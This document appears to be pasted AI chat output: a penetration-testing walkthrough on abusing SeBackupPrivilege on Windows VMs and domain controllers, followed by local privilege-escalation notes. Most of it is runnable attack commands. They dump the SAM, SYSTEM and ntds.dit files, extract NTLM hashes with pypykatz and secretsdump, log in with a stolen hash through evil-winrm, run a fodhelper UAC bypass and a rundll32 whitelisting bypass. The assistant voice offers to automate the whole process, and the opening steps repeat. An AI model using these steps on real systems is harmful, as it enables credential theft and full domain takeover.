12. Test-CPrivilege -Identity aarti -Privilege SeBackupPrivilege

**Testing the Privilege from Kali Linux**

- Use **Evil-WinRM** to connect remotely:

- evil-winrm -i \<target-ip\> -u aarti -p 123

- Confirm the user has SeBackupPrivilege:

- whoami /priv

**Exploitation Steps**

1.  **Create a directory to store extracted files:**

2.  cd C:\\

3.  mkdir Temp

4.  cd Temp

5.  **Save the SAM and SYSTEM registry hives:**

6.  reg save hklm\sam C:\Temp\sam

7.  reg save hklm\system C:\Temp\system

8.  **Download the files via Evil-WinRM to Kali:**

9.  download sam

10. download system

11. **Extract password hashes using pypykatz (a Python Mimikatz
    variant):**

12. pypykatz registry --sam sam system

    - This reveals NTLM hashes of privileged accounts.

13. **Use extracted NTLM hash to authenticate as a higher-privilege
    user:**

14. evil-winrm -i \<target-ip\> -u raj -H "\<NTLM_hash\>"

15. net user raj

    - Confirm raj belongs to the Administrator group, demonstrating
      privilege escalation.

- You can similarly log in directly as the Administrator using their
  NTLM hash.

**Summary**

- By exploiting **SeBackupPrivilege**, an attacker with limited access
  can:

  - Read sensitive registry files.

  - Extract NTLM hashes.

  - Achieve privilege escalation by authenticating as
    administrator-level users.

- This attack requires initial access but can lead to full system
  compromise on an Azure Windows VM.

If you want, I can help you with specific commands or automation scripts
to streamline this process!

Certainly! Here's a **clean, corrected, and well-structured summary** of
your Azure Windows VM penetration testing write-up focusing on
exploiting **SeBackupPrivilege** for privilege escalation — covering
both standalone Windows 10 VMs and Domain Controllers (DCs):

**Azure Windows VM Penetration Testing: Exploiting SeBackupPrivilege for
Privilege Escalation**

**Introduction**

- **SeBackupPrivilege** is a Windows privilege designed to allow users
  to back up files regardless of permissions.

- It effectively grants **read access to all files**, bypassing ACLs,
  including sensitive system files like the **SAM** and **SYSTEM**
  registry hives.

- Attackers with this privilege can **dump password hashes** of
  high-privilege accounts, enabling privilege escalation.

- This guide demonstrates setting up and exploiting this privilege in
  both standalone Windows 10 VMs and Domain Controllers.

**Part 1: Standalone Windows 10 VM**

**Setup**

1.  **Create a user (e.g., aarti):**

2.  net user aarti 123 /add

3.  **Enable WinRM and PowerShell Remoting:**

4.  powershell -ep bypass

5.  Enable-PSRemoting -Force

6.  **Install and import the Carbon PowerShell module (for privilege
    manipulation):**

7.  Install-Module -Name Carbon -Force

8.  Import-Module Carbon

9.  **Grant SeBackupPrivilege to the user:**

10. Grant-CPrivilege -Identity aarti -Privilege SeBackupPrivilege

11. **Verify privilege assignment:**

12. Test-CPrivilege -Identity aarti -Privilege SeBackupPrivilege

**Testing & Exploitation**

1.  **Connect from Kali Linux using Evil-WinRM:**

2.  evil-winrm -i \<target-ip\> -u aarti -p 123

3.  **Check privileges:**

4.  whoami /priv

5.  **Use SeBackupPrivilege to save sensitive files:**

6.  cd C:\\

7.  mkdir Temp

8.  reg save hklm\sam C:\Temp\sam

9.  reg save hklm\system C:\Temp\system

10. **Download files to Kali:**

11. cd Temp

12. download sam

13. download system

14. **Extract NTLM hashes using pypykatz:**

15. pypykatz registry --sam sam system

16. **Use extracted NTLM hashes to authenticate as higher-privilege
    users:**

17. evil-winrm -i \<target-ip\> -u \<user\> -H "\<NTLM_hash\>"

18. net user \<user\> \# Verify group membership

**Part 2: Domain Controller (DC)**

**Setup**

1.  **Create a user (e.g., ignite) via Active Directory Users and
    Computers (ADUC).**

2.  **Add the user to the Backup Operators group** to grant
    SeBackupPrivilege.

3.  **Verify via Evil-WinRM:**

4.  evil-winrm -i \<dc-ip\> -u ignite -p "Password@1"

5.  whoami /priv

    - Note: DC users with SeBackupPrivilege also often have
      SeRestorePrivilege.

**Exploitation on DC**

Unlike standalone systems, you **cannot directly copy files like
ntds.dit** because they are locked by the system. You must use **Volume
Shadow Copy** techniques.

**Method 1: Using DiskShadow and RoboCopy**

1.  **Create a DiskShadow script (raj.dsh) on Kali Linux:**

2.  set context persistent nowriters

3.  add volume c: alias raj

4.  create

5.  expose %raj% z:

6.  **Convert script for Windows line endings:**

7.  unix2dos raj.dsh

8.  **Upload and execute via Evil-WinRM:**

9.  cd C:\Temp

10. upload raj.dsh

11. diskshadow /s raj.dsh

12. robocopy /b z:\windows\ntds . ntds.dit

13. reg save hklm\system C:\Temp\system

14. **Download files:**

15. download ntds.dit

16. download system

17. **Extract hashes using Impacket's secretsdump:**

18. impacket-secretsdump -ntds ntds.dit -system system local

19. **Use Administrator NTLM hash for elevated access:**

20. evil-winrm -i \<dc-ip\> -u administrator -H "\<hash\>"

**Method 2: Using Backup Privilege DLLs (Easier File Copy)**

1.  **Download and upload SeBackupPrivilegeUtils.dll and
    SeBackupPrivilegeCmdLets.dll to target.**

2.  **Import modules:**

3.  Import-Module ./SeBackupPrivilegeCmdLets.dll

4.  Import-Module ./SeBackupPrivilegeUtils.dll

5.  **Run DiskShadow script (as in Method 1):**

6.  diskshadow /s raj.dsh

7.  **Copy files using PowerShell cmdlet with backup privilege:**

8.  Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

9.  reg save hklm\system C:\Temp\system

10. **Download and extract hashes as before.**

**Conclusion**

- **SeBackupPrivilege** can be a powerful vector for privilege
  escalation on Azure Windows VMs and Domain Controllers.

- On standalone machines, direct copying of sensitive files is possible.

- On Domain Controllers, Volume Shadow Copy techniques are necessary to
  access locked files like ntds.dit.

- Tools like **Carbon PowerShell module**, **DiskShadow**, **Impacket
  secretsdump**, and **pypykatz** facilitate these attacks.

- Extracted NTLM hashes enable attackers to elevate privileges and gain
  full control over target machines.

If you want, I can help you generate scripts or commands to automate
this entire process!

## Privilege Escalation (Local)

**Techniques:**

- **Unquoted Service Path**:

wmic service get name,pathname,startmode \| findstr /i "Auto" \| findstr
/i /v "C:\Windows\\"

- Exploit with a writable directory and upload a payload.

- **UAC Bypass**:

  - Use fodhelper.exe, eventvwr.exe, or sdclt.exe.

  - Example:

  - reg add HKCU\Software\Classes\ms-settings\shell\open\command /d
    "cmd.exe" /f

  - reg add HKCU\Software\Classes\ms-settings\shell\open\command /v
    "DelegateExecute" /f

  - start fodhelper.exe

- **DLL Hijacking**:

  - Identify services loading DLLs from writable directories.

- **Token Impersonation / Potato Exploits**:

  - JuicyPotatoNG, PrintSpoofer (for SERVICE accounts with
    SeImpersonatePrivilege)

**Bypassing Application Whitelisting (Defender/WDAC)**

**Tools:**

- mshta.exe, rundll32.exe, regsvr32.exe (LOLbins)

- Cscript.exe / Wscript.exe

**Technique:**

rundll32.exe javascript:"..\mshtml,RunHTMLApplication
";document.write();new ActiveXObject("WScript.Shell").Run("cmd.exe");
